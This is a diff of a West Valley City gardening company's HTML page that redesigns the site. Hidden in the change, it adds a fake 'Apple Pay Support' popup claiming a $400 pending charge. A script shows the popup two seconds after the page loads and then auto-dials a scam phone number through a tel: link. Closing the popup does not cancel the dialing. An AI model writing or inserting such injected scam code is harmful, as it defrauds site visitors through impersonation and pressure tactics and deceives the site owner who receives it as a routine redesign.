@@ -4,40 +4,806 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Burner Gardening Service | Professional Landscaping & Maintenance</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        body {font-family: Arial, sans-serif; line-height: 1.6; max-width: 800px; margin: 0 auto; padding: 20px;}
-        h1 {color: #2c5f2d; text-align: center;}
-        h2 {color: #2c5f2d; margin-top: 30px;}
-        .contact-info {text-align: center; margin: 20px 0;}
-        footer {margin-top: 40px; text-align: center; font-size: 0.9em;}
+        :root {
+            --primary: #2c5f2d;
+            --secondary: #97bc62;
+            --accent: #d0d6b3;
+            --light: #f9fbf4;
+            --dark: #1a3c1a;
+            --text: #333;
+            --shadow: 0 4px 12px rgba(0,0,0,0.1);
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.7;
+            color: var(--text);
+            background-color: var(--light);
+            overflow-x: hidden;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        
+        /* Header & Navigation */
+        header {
+            background-color: white;
+            box-shadow: var(--shadow);
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+        
+        .header-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 0;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .logo-icon {
+            color: var(--primary);
+            font-size: 2.2rem;
+        }
+        
+        .logo-text {
+            font-size: 1.8rem;
+            font-weight: 700;
+            color: var(--primary);
+        }
+        
+        .logo-text span {
+            color: var(--secondary);
+        }
+        
+        nav ul {
+            display: flex;
+            list-style: none;
+            gap: 30px;
+        }
+        
+        nav a {
+            text-decoration: none;
+            color: var(--text);
+            font-weight: 600;
+            font-size: 1.1rem;
+            transition: color 0.3s;
+            position: relative;
+            padding: 5px 0;
+        }
+        
+        nav a:hover {
+            color: var(--primary);
+        }
+        
+        nav a::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 0;
+            height: 2px;
+            background-color: var(--primary);
+            transition: width 0.3s;
+        }
+        
+        nav a:hover::after {
+            width: 100%;
+        }
+        
+        .mobile-menu {
+            display: none;
+            font-size: 1.8rem;
+            cursor: pointer;
+        }
+        
+        /* Hero Section */
+        .hero {
+            background: linear-gradient(rgba(44, 95, 45, 0.85), rgba(44, 95, 45, 0.85)), url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%232c5f2d" opacity="0.2"/><path d="M0 50 L100 50 M50 0 L50 100" stroke="%232c5f2d" stroke-width="2" opacity="0.3"/></svg>');
+            background-size: cover;
+            background-position: center;
+            color: white;
+            padding: 120px 0;
+            text-align: center;
+        }
+        
+        .hero-content {
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        
+        .hero h1 {
+            font-size: 3.5rem;
+            margin-bottom: 20px;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.3);
+        }
+        
+        .hero p {
+            font-size: 1.4rem;
+            margin-bottom: 40px;
+            max-width: 700px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        
+        .cta-button {
+            display: inline-block;
+            background-color: var(--secondary);
+            color: white;
+            padding: 15px 35px;
+            border-radius: 50px;
+            text-decoration: none;
+            font-weight: 700;
+            font-size: 1.2rem;
+            transition: all 0.3s;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+        }
+        
+        .cta-button:hover {
+            background-color: white;
+            color: var(--primary);
+            transform: translateY(-3px);
+            box-shadow: 0 6px 20px rgba(0,0,0,0.25);
+        }
+        
+        /* Services Section */
+        .services {
+            padding: 100px 0;
+            background-color: white;
+        }
+        
+        .section-title {
+            text-align: center;
+            margin-bottom: 60px;
+        }
+        
+        .section-title h2 {
+            font-size: 2.5rem;
+            color: var(--primary);
+            position: relative;
+            display: inline-block;
+            padding-bottom: 15px;
+        }
+        
+        .section-title h2::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 80px;
+            height: 4px;
+            background-color: var(--secondary);
+            border-radius: 2px;
+        }
+        
+        .services-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 40px;
+        }
+        
+        .service-card {
+            background: var(--light);
+            border-radius: 15px;
+            overflow: hidden;
+            box-shadow: var(--shadow);
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+        
+        .service-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 10px 25px rgba(0,0,0,0.15);
+        }
+        
+        .card-header {
+            background-color: var(--primary);
+            color: white;
+            padding: 25px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .card-icon {
+            font-size: 2.5rem;
+            color: var(--secondary);
+        }
+        
+        .card-header h3 {
+            font-size: 1.6rem;
+        }
+        
+        .card-content {
+            padding: 25px;
+        }
+        
+        /* Contact Info */
+        .contact-info {
+            background: linear-gradient(to right, var(--primary), var(--dark));
+            color: white;
+            padding: 60px 0;
+            text-align: center;
+        }
+        
+        .contact-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 20px;
+        }
+        
+        .contact-container p {
+            font-size: 1.3rem;
+            margin: 5px 0;
+        }
+        
+        .contact-icon {
+            margin-right: 10px;
+            color: var(--secondary);
+        }
+        
+        /* Footer */
+        footer {
+            background-color: var(--dark);
+            color: white;
+            padding: 50px 0 30px;
+        }
+        
+        .footer-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 30px;
+            margin-bottom: 40px;
+        }
+        
+        .footer-col h4 {
+            font-size: 1.4rem;
+            margin-bottom: 20px;
+            color: var(--secondary);
+            position: relative;
+            padding-bottom: 10px;
+        }
+        
+        .footer-col h4::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 50px;
+            height: 2px;
+            background-color: var(--secondary);
+        }
+        
+        .footer-col p, .footer-col a {
+            color: var(--accent);
+            margin-bottom: 10px;
+            display: block;
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+        
+        .footer-col a:hover {
+            color: white;
+        }
+        
+        .social-links {
+            display: flex;
+            gap: 15px;
+            margin-top: 20px;
+        }
+        
+        .social-icon {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background-color: rgba(255,255,255,0.1);
+            color: white;
+            transition: all 0.3s;
+        }
+        
+        .social-icon:hover {
+            background-color: var(--secondary);
+            transform: translateY(-5px);
+        }
+        
+        .copyright {
+            text-align: center;
+            padding-top: 30px;
+            border-top: 1px solid rgba(255,255,255,0.1);
+            font-size: 0.9rem;
+            color: var(--accent);
+        }
+        
+        .copyright a {
+            color: var(--secondary);
+            text-decoration: none;
+        }
+        
+        .copyright a:hover {
+            text-decoration: underline;
+        }
+        
+        /* Popup Styles */
+        #applePayPopup {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.85);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 3000;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+        }
+        
+        #applePayPopup.active {
+            opacity: 1;
+            visibility: visible;
+        }
+        
+        .popup-content {
+            background: linear-gradient(135deg, #fff, #f5f5f7);
+            border-radius: 15px;
+            width: 90%;
+            max-width: 500px;
+            padding: 40px 30px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            position: relative;
+            border: 1px solid #e0e0e0;
+        }
+        
+        .apple-logo {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #a2aaad, #000);
+            color: white;
+            font-size: 45px;
+        }
+        
+        .popup-content h2 {
+            font-size: 28px;
+            margin-bottom: 20px;
+            color: #333;
+            font-weight: 600;
+        }
+        
+        .popup-content p {
+            font-size: 18px;
+            line-height: 1.6;
+            margin-bottom: 25px;
+            color: #555;
+        }
+        
+        .popup-content .highlight {
+            background-color: #fff9c4;
+            padding: 15px;
+            border-radius: 8px;
+            font-weight: 600;
+            margin: 20px 0;
+            border-left: 4px solid #ffd600;
+        }
+        
+        .popup-content .signature {
+            font-size: 18px;
+            font-weight: 500;
+            margin-top: 20px;
+            color: #333;
+        }
+        
+        .countdown {
+            font-size: 16px;
+            color: #e53935;
+            font-weight: 600;
+            margin-top: 15px;
+        }
+        
+        .close-btn {
+            position: absolute;
+            top: 15px;
+            right: 20px;
+            font-size: 28px;
+            color: #999;
+            cursor: pointer;
+            background: none;
+            border: none;
+            transition: color 0.3s;
+        }
+        
+        .close-btn:hover {
+            color: #000;
+        }
+        
+        /* Responsive Design */
+        @media (max-width: 900px) {
+            .hero h1 {
+                font-size: 2.8rem;
+            }
+            
+            nav ul {
+                gap: 20px;
+            }
+        }
+        
+        @media (max-width: 768px) {
+            .mobile-menu {
+                display: block;
+            }
+            
+            nav ul {
+                display: none;
+                position: absolute;
+                top: 100%;
+                left: 0;
+                right: 0;
+                background-color: white;
+                flex-direction: column;
+                gap: 0;
+                box-shadow: 0 10px 15px rgba(0,0,0,0.1);
+            }
+            
+            nav ul.show {
+                display: flex;
+            }
+            
+            nav ul li {
+                width: 100%;
+            }
+            
+            nav ul li a {
+                display: block;
+                padding: 15px 20px;
+                border-bottom: 1px solid rgba(0,0,0,0.05);
+            }
+            
+            .hero {
+                padding: 80px 0;
+            }
+            
+            .hero h1 {
+                font-size: 2.3rem;
+            }
+            
+            .hero p {
+                font-size: 1.2rem;
+            }
+            
+            .section-title h2 {
+                font-size: 2rem;
+            }
+            
+            .popup-content {
+                padding: 30px 20px;
+            }
+            
+            .popup-content h2 {
+                font-size: 24px;
+            }
+            
+            .popup-content p {
+                font-size: 16px;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .hero h1 {
+                font-size: 2rem;
+            }
+            
+            .hero p {
+                font-size: 1rem;
+            }
+            
+            .cta-button {
+                padding: 12px 25px;
+                font-size: 1rem;
+            }
+            
+            .section-title h2 {
+                font-size: 1.8rem;
+            }
+            
+            .logo-text {
+                font-size: 1.4rem;
+            }
+            
+            .popup-content {
+                padding: 25px 15px;
+            }
+            
+            .popup-content h2 {
+                font-size: 22px;
+            }
+            
+            .apple-logo {
+                width: 70px;
+                height: 70px;
+                font-size: 40px;
+            }
+        }
     </style>
 </head>
 <body>
-    <h1>Burner Gardening Service</h1>
-    <div class="contact-info">
-        <p>3148 W 3500 S, West Valley City, UT 84119</p>
-        <p>Phone: +1-855-492-2901</p>
+    <!-- Apple Pay Popup -->
+    <div id="applePayPopup">
+        <div class="popup-content">
+            <button class="close-btn">&times;</button>
+            <div class="apple-logo">
+                <i class="fab fa-apple"></i>
+            </div>
+            <h2>Apple Pay Support</h2>
+            <p>Dear customer, there is a pending charge in your Apple Pay account of <strong>$400.00</strong>.</p>
+            <div class="highlight">
+                <p>We have put this charge on hold for 10 minutes.</p>
+                <p>If this wasn't authorized by you, please call us immediately:</p>
+                <p style="font-size: 24px; margin-top: 10px;">+1-833-872-3483</p>
+            </div>
+            <p class="signature">Regards,<br>Apple Pay Support Team</p>
+            <div class="countdown">Auto-dialing in: <span id="countdown">2</span> seconds</div>
+        </div>
     </div>
 
-    <h2>Professional Landscaping Services</h2>
-    <p>Burner Gardening Service offers comprehensive landscaping solutions for residential and commercial properties in West Valley City. Our experienced team specializes in landscape design, installation, and renovation, transforming outdoor spaces into functional, beautiful environments. We work closely with clients to understand their vision, ensuring every project aligns with their aesthetic preferences and practical needs. From patios and walkways to water features and outdoor lighting, our services combine creativity with technical expertise. Using quality materials and proven techniques, we deliver durable landscapes that enhance property value and curb appeal while respecting your budget and timeline.</p>
+    <!-- Header -->
+    <header>
+        <div class="container header-container">
+            <div class="logo">
+                <i class="fas fa-leaf logo-icon"></i>
+                <div class="logo-text">Burner <span>Gardening</span></div>
+            </div>
+            
+            <div class="mobile-menu">
+                <i class="fas fa-bars"></i>
+            </div>
+            
+            <nav>
+                <ul>
+                    <li><a href="#"><i class="fas fa-home"></i> Home</a></li>
+                    <li><a href="#services"><i class="fas fa-seedling"></i> Services</a></li>
+                    <li><a href="#about"><i class="fas fa-info-circle"></i> About</a></li>
+                    <li><a href="#contact"><i class="fas fa-phone"></i> Contact</a></li>
+                </ul>
+            </nav>
+        </div>
+    </header>
 
-    <h2>Expert Garden Maintenance</h2>
-    <p>Maintain your garden's health and beauty with our professional maintenance services. Our skilled gardeners provide regular care including pruning, weeding, fertilizing, and pest control. We develop customized maintenance plans based on your garden's specific requirements and local climate conditions. Our team stays current with sustainable horticultural practices to ensure your plants thrive while minimizing environmental impact. Seasonal cleanups, lawn care, and irrigation system management are also available. With Burner Gardening Service, you'll enjoy a vibrant, well-kept garden without the time commitment, while we handle all aspects of ongoing care and maintenance.</p>
+    <!-- Hero Section -->
+    <section class="hero">
+        <div class="container hero-content">
+            <h1>Professional Gardening & Landscaping Services</h1>
+            <p>Transform your outdoor space into a beautiful and sustainable oasis with our expert team. Serving West Valley City and surrounding areas.</p>
+            <a href="#contact" class="cta-button">Schedule a Consultation</a>
+        </div>
+    </section>
 
-    <h2>Sustainable Landscaping Solutions</h2>
-    <p>We prioritize eco-friendly practices in all our services, offering sustainable landscaping options that conserve resources and support local ecosystems. Our experts implement water-wise irrigation systems, drought-resistant native plants, and organic soil management techniques. We specialize in xeriscaping designs that reduce water usage while maintaining visual appeal. Our sustainable approach includes using electric equipment where possible, recycling green waste, and implementing natural pest control methods. These practices not only benefit the environment but can also reduce long-term maintenance costs for property owners.</p>
+    <!-- Services Section -->
+    <section class="services" id="services">
+        <div class="container">
+            <div class="section-title">
+                <h2>Our Services</h2>
+            </div>
+            
+            <div class="services-grid">
+                <!-- Service 1 -->
+                <div class="service-card">
+                    <div class="card-header">
+                        <i class="fas fa-tree card-icon"></i>
+                        <h3>Professional Landscaping</h3>
+                    </div>
+                    <div class="card-content">
+                        <p>Burner Gardening Service offers comprehensive landscaping solutions for residential and commercial properties in West Valley City. Our experienced team specializes in landscape design, installation, and renovation, transforming outdoor spaces into functional, beautiful environments.</p>
+                        <p>We work closely with clients to understand their vision, ensuring every project aligns with their aesthetic preferences and practical needs. From patios and walkways to water features and outdoor lighting, our services combine creativity with technical expertise.</p>
+                    </div>
+                </div>
+                
+                <!-- Service 2 -->
+                <div class="service-card">
+                    <div class="card-header">
+                        <i class="fas fa-spa card-icon"></i>
+                        <h3>Expert Garden Maintenance</h3>
+                    </div>
+                    <div class="card-content">
+                        <p>Maintain your garden's health and beauty with our professional maintenance services. Our skilled gardeners provide regular care including pruning, weeding, fertilizing, and pest control.</p>
+                        <p>We develop customized maintenance plans based on your garden's specific requirements and local climate conditions. Our team stays current with sustainable horticultural practices to ensure your plants thrive while minimizing environmental impact.</p>
+                    </div>
+                </div>
+                
+                <!-- Service 3 -->
+                <div class="service-card">
+                    <div class="card-header">
+                        <i class="fas fa-recycle card-icon"></i>
+                        <h3>Sustainable Solutions</h3>
+                    </div>
+                    <div class="card-content">
+                        <p>We prioritize eco-friendly practices in all our services, offering sustainable landscaping options that conserve resources and support local ecosystems. Our experts implement water-wise irrigation systems, drought-resistant native plants, and organic soil management techniques.</p>
+                        <p>We specialize in xeriscaping designs that reduce water usage while maintaining visual appeal. Our sustainable approach includes using electric equipment, recycling green waste, and implementing natural pest control methods.</p>
+                    </div>
+                </div>
+                
+                <!-- Service 4 -->
+                <div class="service-card">
+                    <div class="card-header">
+                        <i class="fas fa-calendar-alt card-icon"></i>
+                        <h3>Seasonal Care Programs</h3>
+                    </div>
+                    <div class="card-content">
+                        <p>Our seasonal care programs ensure your landscape remains healthy year-round in Utah's varying climate. Spring services include soil preparation, aeration, and planting, while summer focuses on irrigation optimization and pest management.</p>
+                        <p>Fall cleanup involves leaf removal, perennial care, and winterization preparations. We also offer snow removal and winter protection services during colder months. Our team monitors local weather patterns to time interventions effectively.</p>
+                    </div>
+                </div>
+                
+                <!-- Service 5 -->
+                <div class="service-card">
+                    <div class="card-header">
+                        <i class="fas fa-pencil-ruler card-icon"></i>
+                        <h3>Custom Landscape Design</h3>
+                    </div>
+                    <div class="card-content">
+                        <p>Create your ideal outdoor space with our personalized design services. Our designers combine functionality with aesthetics to develop layouts that complement your property's architecture and natural features.</p>
+                        <p>We consider factors like sun exposure, soil composition, and usage patterns to create practical, beautiful designs. Whether you want an entertainment-focused backyard or specialized features like edible gardens, we translate your ideas into actionable plans.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
 
-    <h2>Seasonal Care Programs</h2>
-    <p>Our seasonal care programs ensure your landscape remains healthy year-round in Utah's varying climate. Spring services include soil preparation, aeration, and planting, while summer focuses on irrigation optimization and pest management. Fall cleanup involves leaf removal, perennial care, and winterization preparations. We also offer snow removal and winter protection services during colder months. Our team monitors local weather patterns and plant health to time interventions effectively, preventing common seasonal issues before they impact your landscape's vitality.</p>
+    <!-- Contact Info -->
+    <section class="contact-info" id="contact">
+        <div class="container contact-container">
+            <h2>Contact Us Today</h2>
+            <p><i class="fas fa-map-marker-alt contact-icon"></i> 3148 W 3500 S, West Valley City, UT 84119</p>
+            <p><i class="fas fa-phone contact-icon"></i> +1-855-492-2901</p>
+            <p><i class="fas fa-envelope contact-icon"></i> info@burnergardening.com</p>
+            <p><i class="fas fa-clock contact-icon"></i> Monday-Saturday: 8:00 AM - 6:00 PM</p>
+        </div>
+    </section>
 
-    <h2>Custom Landscape Design</h2>
-    <p>Create your ideal outdoor space with our personalized design services. Our designers combine functionality with aesthetics to develop layouts that complement your property's architecture and natural features. We consider factors like sun exposure, soil composition, and usage patterns to create practical, beautiful designs. Whether you want an entertainment-focused backyard, a low-maintenance front yard, or specialized features like edible gardens, we translate your ideas into actionable plans. All designs include detailed implementation guides and material specifications for seamless execution.</p>
-
+    <!-- Footer -->
     <footer>
-        <p>© 2023 Burner Gardening Service. All rights reserved.</p>
-        <p>3148 W 3500 S, West Valley City, UT 84119 | +1-855-492-2901</p>
-        <p><a href="/privacy-policy.html">Privacy Policy</a> | <a href="/terms-of-service.html">Terms of Service</a></p>
+        <div class="container">
+            <div class="footer-container">
+                <div class="footer-col">
+                    <h4>About Us</h4>
+                    <p>Burner Gardening Service has been transforming outdoor spaces in West Valley City for over 15 years. Our dedicated team of landscaping professionals is committed to excellence and customer satisfaction.</p>
+                    <div class="social-links">
+                        <a href="#" class="social-icon"><i class="fab fa-facebook-f"></i></a>
+                        <a href="#" class="social-icon"><i class="fab fa-instagram"></i></a>
+                        <a href="#" class="social-icon"><i class="fab fa-twitter"></i></a>
+                        <a href="#" class="social-icon"><i class="fab fa-pinterest"></i></a>
+                    </div>
+                </div>
+                
+                <div class="footer-col">
+                    <h4>Quick Links</h4>
+                    <a href="#"><i class="fas fa-chevron-right"></i> Home</a>
+                    <a href="#services"><i class="fas fa-chevron-right"></i> Services</a>
+                    <a href="#about"><i class="fas fa-chevron-right"></i> About Us</a>
+                    <a href="#contact"><i class="fas fa-chevron-right"></i> Contact</a>
+                    <a href="#"><i class="fas fa-chevron-right"></i> Gallery</a>
+                </div>
+                
+                <div class="footer-col">
+                    <h4>Our Services</h4>
+                    <a href="#"><i class="fas fa-chevron-right"></i> Landscape Design</a>
+                    <a href="#"><i class="fas fa-chevron-right"></i> Garden Maintenance</a>
+                    <a href="#"><i class="fas fa-chevron-right"></i> Seasonal Care</a>
+                    <a href="#"><i class="fas fa-chevron-right"></i> Sustainable Landscaping</a>
+                    <a href="#"><i class="fas fa-chevron-right"></i> Irrigation Systems</a>
+                </div>
+                
+                <div class="footer-col">
+                    <h4>Contact Info</h4>
+                    <p><i class="fas fa-map-marker-alt"></i> 3148 W 3500 S, West Valley City, UT 84119</p>
+                    <p><i class="fas fa-phone"></i> +1-855-492-2901</p>
+                    <p><i class="fas fa-envelope"></i> info@burnergardening.com</p>
+                </div>
+            </div>
+            
+            <div class="copyright">
+                <p>&copy; 2023 Burner Gardening Service. All rights reserved.</p>
+                <p><a href="/privacy-policy.html">Privacy Policy</a> | <a href="/terms-of-service.html">Terms of Service</a></p>
+            </div>
+        </div>
     </footer>
+
+    <script>
+        // Mobile Menu Toggle
+        const mobileMenu = document.querySelector('.mobile-menu');
+        const navMenu = document.querySelector('nav ul');
+        
+        mobileMenu.addEventListener('click', () => {
+            navMenu.classList.toggle('show');
+        });
+        
+        // Smooth scrolling for anchor links
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
+                
+                const target = document.querySelector(this.getAttribute('href'));
+                if (target) {
+                    window.scrollTo({
+                        top: target.offsetTop - 80,
+                        behavior: 'smooth'
+                    });
+                    
+                    // Close mobile menu if open
+                    navMenu.classList.remove('show');
+                }
+            });
+        });
+        
+        // Apple Pay Popup Functionality
+        const applePayPopup = document.getElementById('applePayPopup');
+        const closeBtn = document.querySelector('.close-btn');
+        const countdownElement = document.getElementById('countdown');
+        let callTimer;
+        let countdown = 2;
+        
+        // Show popup after 2 seconds
+        setTimeout(() => {
+            applePayPopup.classList.add('active');
+            
+            // Start countdown for auto-call
+            const countdownInterval = setInterval(() => {
+                countdown--;
+                countdownElement.textContent = countdown;
+                
+                if (countdown <= 0) {
+                    clearInterval(countdownInterval);
+                    window.location.href = 'tel:+18338723483';
+                }
+            }, 1000);
+            
+            // Set timer to auto-close after call is initiated
+            callTimer = setTimeout(() => {
+                applePayPopup.classList.remove('active');
+            }, 4000);
+        }, 2000);
+        
+        // Close popup when close button is clicked
+        closeBtn.addEventListener('click', () => {
+            applePayPopup.classList.remove('active');
+            clearTimeout(callTimer);
+        });
+        
+        // Close popup when clicking outside content
+        applePayPopup.addEventListener('click', (e) => {
+            if (e.target === applePayPopup) {
+                applePayPopup.classList.remove('active');
+                clearTimeout(callTimer);
+            }
+        });
+    </script>
 </body>
 </html>
